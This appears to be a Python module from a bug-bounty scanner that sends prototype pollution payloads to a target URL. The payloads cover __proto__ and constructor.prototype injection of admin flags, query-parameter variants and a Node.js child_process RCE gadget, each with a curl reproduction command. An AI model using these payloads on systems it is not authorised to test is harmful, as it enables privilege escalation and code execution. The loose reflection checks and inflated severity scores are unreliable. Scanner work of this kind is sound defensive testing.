"""
Prototype Pollution Vulnerability Detector
Detects prototype pollution vulnerabilities in JavaScript/Node.js applications
Reward potential: $1000-8000+

Detection techniques:
- __proto__ pollution testing
- constructor.prototype pollution
- JSON payload injection
- Query parameter pollution
- Object merge vulnerabilities
- Property override detection

CWE: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)
OWASP: A08:2021 - Software and Data Integrity Failures
"""

import asyncio
import re
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .registry import register_active

# Prototype pollution payloads for JSON
PROTO_POLLUTION_JSON_PAYLOADS = [
    # __proto__ pollution
    {'__proto__': {'polluted': 'yes'}},
    {'__proto__': {'isAdmin': True}},
    {'__proto__': {'admin': True}},
    {'__proto__': {'role': 'admin'}},

    # constructor.prototype pollution
    {'constructor': {'prototype': {'polluted': 'yes'}}},
    {'constructor': {'prototype': {'isAdmin': True}}},

    # Nested pollution
    {'user': {'__proto__': {'isAdmin': True}}},
    {'profile': {'__proto__': {'role': 'admin'}}},
]

# Query parameter pollution patterns
PROTO_POLLUTION_QUERY_PARAMS = [
    ('__proto__[polluted]', 'yes'),
    ('__proto__[isAdmin]', 'true'),
    ('__proto__[admin]', 'true'),
    ('constructor[prototype][polluted]', 'yes'),
    ('constructor[prototype][isAdmin]', 'true'),
]

# Indicators that pollution might have succeeded
POLLUTION_SUCCESS_INDICATORS = [
    r'"polluted"\s*:\s*"yes"',
    r'"isAdmin"\s*:\s*true',
    r'"admin"\s*:\s*true',
    r'"role"\s*:\s*"admin"',
    r'polluted.*yes',
    r'isAdmin.*true',
]

# Error indicators suggesting prototype pollution attempt was processed
POLLUTION_ERROR_INDICATORS = [
    '__proto__',
    'prototype',
    'constructor',
    'cannot set property',
    'cannot assign to read only property',
    'cyclic object',
    'circular structure',
    'maximum call stack',
]

# Node.js/JavaScript framework indicators
JS_FRAMEWORK_INDICATORS = [
    'express',
    'node',
    'npm',
    'webpack',
    'react',
    'vue',
    'angular',
    'next.js',
    'nuxt',
    'x-powered-by: express',
]


def is_nodejs_app(response_headers, response_text):
    """Check if application is likely Node.js/JavaScript"""
    # Check headers
    headers_str = str(response_headers).lower()
    if any(indicator in headers_str for indicator in JS_FRAMEWORK_INDICATORS):
        return True

    # Check response body
    response_lower = response_text.lower()
    if any(indicator in response_lower for indicator in JS_FRAMEWORK_INDICATORS):
        return True

    return False


def detect_pollution_success(response_text):
    """Check if response indicates successful prototype pollution"""
    for pattern in POLLUTION_SUCCESS_INDICATORS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False


def detect_pollution_errors(response_text):
    """Check if response contains prototype pollution related errors"""
    response_lower = response_text.lower()
    return any(indicator in response_lower for indicator in POLLUTION_ERROR_INDICATORS)


@register_active
async def prototype_pollution_detector(session, url, context):
    """
    Detect prototype pollution vulnerabilities

    Tests:
    1. JSON payload pollution (__proto__, constructor.prototype)
    2. Query parameter pollution
    3. Object merge vulnerabilities
    4. Property override detection
    5. Reflected pollution in response

    Returns list of prototype pollution vulnerability findings
    """
    findings = []

    try:
        # Get baseline response
        baseline_response = await session.get(url, allow_redirects=False)
        baseline_text = await baseline_response.text()
        baseline_status = baseline_response.status
        baseline_headers = baseline_response.headers

        # Check if this is likely a Node.js/JavaScript application
        is_js_app = is_nodejs_app(baseline_headers, baseline_text)

        # Test 1: JSON POST payload pollution
        # Look for endpoints that accept JSON
        if baseline_status == 200:
            for payload in PROTO_POLLUTION_JSON_PAYLOADS:
                try:
                    response = await session.post(
                        url,
                        json=payload,
                        headers={'Content-Type': 'application/json'},
                        allow_redirects=False,
                        timeout=8
                    )

                    response_text = await response.text()

                    # Check if pollution was successful (reflected in response)
                    if detect_pollution_success(response_text):
                        # Extract the polluted property
                        polluted_key = list(payload.get('__proto__', payload.get('constructor', {}).get('prototype', {})).keys())[0]

                        findings.append({
                            'type': 'Prototype Pollution - JSON Payload',
                            'severity': 'critical',
                            'confidence': 'high',
                            'url': url,
                            'method': 'POST',
                            'evidence': f'Prototype pollution detected! JSON payload with __proto__ or constructor.prototype was processed and reflected in response. Polluted property "{polluted_key}" appears in response: {response_text[:400]}. This allows attackers to modify Object.prototype affecting all objects.',
                            'payload': json.dumps(payload),
                            'polluted_property': polluted_key,
                            'response_status': response.status,
                            'response_length': len(response_text),
                            'cvss_score': 9.8,
                            'cwe': 'CWE-1321',
                            'impact': 'Critical! Prototype pollution allows attackers to inject properties into all JavaScript objects. This can lead to: Remote Code Execution (RCE), authentication bypass, privilege escalation, DoS attacks, logic manipulation, and security control bypass. Attacker can modify application behavior at runtime.',
                            'recommendation': '1. Never merge user input directly into objects\n2. Use Object.create(null) for objects that will hold user data\n3. Freeze Object.prototype: Object.freeze(Object.prototype)\n4. Use JSON schema validation\n5. Implement input sanitization to block __proto__ and constructor\n6. Use Map instead of plain objects for user data\n7. Update dependencies (lodash, jQuery, etc.) to patched versions',
                            'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{json.dumps(payload)}\'',
                        })

                        # Found high-confidence pollution, break
                        break

                    # Check for errors indicating pollution attempt
                    elif detect_pollution_errors(response_text):
                        findings.append({
                            'type': 'Prototype Pollution - Error-Based Detection',
                            'severity': 'high',
                            'confidence': 'medium',
                            'url': url,
                            'method': 'POST',
                            'evidence': f'Prototype pollution attempt triggered an error! Server processed __proto__ or constructor.prototype in JSON payload. Error message suggests vulnerable object merging. Response: {response_text[:400]}',
                            'payload': json.dumps(payload),
                            'response_status': response.status,
                            'response_length': len(response_text),
                            'cvss_score': 8.6,
                            'cwe': 'CWE-1321',
                            'impact': 'Potential prototype pollution vulnerability. Server processes prototype chain properties, which could be exploited to pollute Object.prototype and affect application behavior.',
                            'recommendation': '1. Sanitize JSON input to remove __proto__ and constructor\n2. Use safe object merging libraries\n3. Validate JSON schema before processing\n4. Implement prototype pollution protection',
                            'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{json.dumps(payload)}\'',
                        })
                        break

                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue

        # Test 2: Query parameter pollution
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # If URL has no params, try adding test params
        if not query_params:
            query_params = {'test': ['value']}

        for param_name, param_value in PROTO_POLLUTION_QUERY_PARAMS:
            # Add pollution parameter to URL
            test_params = query_params.copy()
            test_params[param_name] = [param_value]

            test_query = urlencode(test_params, doseq=True)
            test_parsed = parsed._replace(query=test_query)
            test_url = urlunparse(test_parsed)

            try:
                response = await session.get(test_url, allow_redirects=False, timeout=8)
                response_text = await response.text()

                # Check if pollution parameter is reflected or processed
                if param_value in response_text or detect_pollution_success(response_text):
                    findings.append({
                        'type': 'Prototype Pollution - Query Parameter',
                        'severity': 'high',
                        'confidence': 'medium',
                        'url': url,
                        'method': 'GET',
                        'evidence': f'Prototype pollution via query parameter! Parameter "{param_name}={param_value}" was processed and reflected. This suggests vulnerable object property assignment from query parameters.',
                        'parameter': param_name,
                        'value': param_value,
                        'response_status': response.status,
                        'test_url': test_url,
                        'cvss_score': 7.8,
                        'cwe': 'CWE-1321',
                        'impact': 'Query parameter prototype pollution allows attackers to pollute Object.prototype via URL parameters. This can lead to authentication bypass, privilege escalation, or DoS by manipulating application logic.',
                        'recommendation': '1. Validate and sanitize query parameters\n2. Do not directly assign query params to object properties\n3. Use allowlist for accepted parameters\n4. Block __proto__ and constructor in parameter names',
                        'repro_command': f'curl "{test_url}"',
                    })
                    break

            except Exception:
                continue

        # Test 3: If there's a JSON API endpoint, test nested pollution
        if baseline_status == 200 and ('application/json' in baseline_headers.get('content-type', '')):
            nested_payload = {
                'user': {
                    'name': 'test',
                    '__proto__': {
                        'isAdmin': True
                    }
                }
            }

            try:
                response = await session.post(
                    url,
                    json=nested_payload,
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                    timeout=8
                )

                response_text = await response.text()

                if detect_pollution_success(response_text) or 'isAdmin' in response_text:
                    findings.append({
                        'type': 'Prototype Pollution - Nested Object',
                        'severity': 'critical',
                        'confidence': 'high',
                        'url': url,
                        'method': 'POST',
                        'evidence': f'Nested prototype pollution detected! Server merged nested object containing __proto__ property. Response contains polluted property "isAdmin". This indicates vulnerable recursive object merging.',
                        'payload': json.dumps(nested_payload),
                        'response_status': response.status,
                        'cvss_score': 9.6,
                        'cwe': 'CWE-1321',
                        'impact': 'Critical nested prototype pollution! Attackers can hide pollution payloads in nested objects to bypass simple filters. This can lead to full application compromise through RCE or authentication bypass.',
                        'recommendation': '1. Use recursive object sanitization\n2. Implement deep JSON validation\n3. Block __proto__ at any nesting level\n4. Use Object.freeze() on prototype\n5. Consider using Map for nested data',
                        'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{json.dumps(nested_payload)}\'',
                    })

            except Exception:
                pass

        # Test 4: Array-based pollution (for frameworks that parse arrays)
        array_payload = {
            'items': [
                {'name': 'item1'},
                {'__proto__': {'polluted': 'yes'}}
            ]
        }

        try:
            response = await session.post(
                url,
                json=array_payload,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
                timeout=8
            )

            response_text = await response.text()

            if detect_pollution_success(response_text):
                findings.append({
                    'type': 'Prototype Pollution - Array-Based',
                    'severity': 'high',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'POST',
                    'evidence': f'Array-based prototype pollution detected! Server processed array containing __proto__ property. This indicates vulnerable array element merging.',
                    'payload': json.dumps(array_payload),
                    'response_status': response.status,
                    'cvss_score': 8.2,
                    'cwe': 'CWE-1321',
                    'impact': 'Prototype pollution via array elements. Attackers can hide pollution in array items to bypass filters and pollute Object.prototype.',
                    'recommendation': '1. Validate array elements\n2. Sanitize objects in arrays\n3. Avoid merging array elements directly\n4. Use safe array processing methods',
                    'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{json.dumps(array_payload)}\'',
                })

        except Exception:
            pass

        # Test 5: Check if Node.js app with potential gadget chains
        if is_js_app:
            # Test for common vulnerable patterns
            rce_payload = {
                '__proto__': {
                    'shell': 'sh',
                    'argv0': 'sh',
                    'argv': ['-c', 'echo VULNERABLE'],
                }
            }

            try:
                response = await session.post(
                    url,
                    json=rce_payload,
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                    timeout=8
                )

                response_text = await response.text()

                # Check if any of the payload properties leaked
                if 'argv' in response_text or 'shell' in response_text:
                    findings.append({
                        'type': 'Prototype Pollution - RCE Gadget Chain',
                        'severity': 'critical',
                        'confidence': 'medium',
                        'url': url,
                        'method': 'POST',
                        'evidence': f'Potential prototype pollution with RCE gadget chain! Node.js application processed __proto__ payload with child_process properties. This could lead to Remote Code Execution.',
                        'payload': json.dumps(rce_payload),
                        'response_status': response.status,
                        'cvss_score': 10.0,
                        'cwe': 'CWE-1321',
                        'impact': 'CRITICAL! Prototype pollution in Node.js application with potential RCE gadget chain. If application uses child_process or similar modules, attacker can achieve Remote Code Execution by polluting process spawning options.',
                        'recommendation': '1. URGENT: Patch prototype pollution immediately\n2. Audit all object merge operations\n3. Review child_process usage\n4. Implement strict input validation\n5. Update all dependencies\n6. Consider using VM2 or isolated sandboxes',
                        'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{json.dumps(rce_payload)}\'',
                    })

            except Exception:
                pass

    except Exception:
        pass

    return findings
